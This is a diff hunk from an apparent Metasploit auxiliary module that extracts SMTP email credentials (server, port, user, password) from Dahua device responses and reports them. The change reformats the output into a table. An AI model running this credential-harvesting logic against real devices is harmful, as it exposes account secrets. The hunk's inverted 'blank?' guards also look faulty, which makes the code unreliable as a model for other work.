@@ -104,20 +104,21 @@ class Metasploit3 < Msf::Auxiliary
     return unless (response = sock.get_once)
     data = response.split('&&')
     return unless data.first =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?(?:\.[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?)*\.?+:\d+)/i
-    print_status("Email Settings: @ #{rhost}:#{rport}!")
+    email_table = Rex::Ui::Text::Table.new(
+      'Header' => 'Dahua Email Settings',
+      'Indent' => '1',
+      'Columns' => ['Email Server', 'Email Port', 'Email User', 'Email Password']
+    )
     if mailhost = Regexp.last_match[1].split(':')
-      print_status("  Server: #{mailhost[0]}") unless mailhost[0].nil?
-      print_status("  Server Port: #{mailhost[1]}") unless mailhost[1].nil?
-      print_status("  Destination Email: #{data[1]}") unless mailhost[1].nil?
+      mailserver = "#{mailhost[0]}"
+      mailport = "#{mailhost[1]}"
     end
     return unless data[5].blank? && data[6].blank?
-    print_good("  SMTP User: #{data[5]}")
-    print_good("  SMTP Password: #{data[6]}")
     muser = "#{data[5]}"
     mpass = "#{data[6]}"
-    mailserver = "#{mailhost[0]}"
-    mailport = "#{mailhost[1]}"
+    email_table << ["#{mailserver}", "#{mailport}", "#{muser}", "#{mpass}"]
     return unless mailserver.blank? && mailport.blank? && muser.blank? && mpass.blank?
+    email_table.print
     report_email_creds(mailserver, mailport, muser, mpass)
   end
 
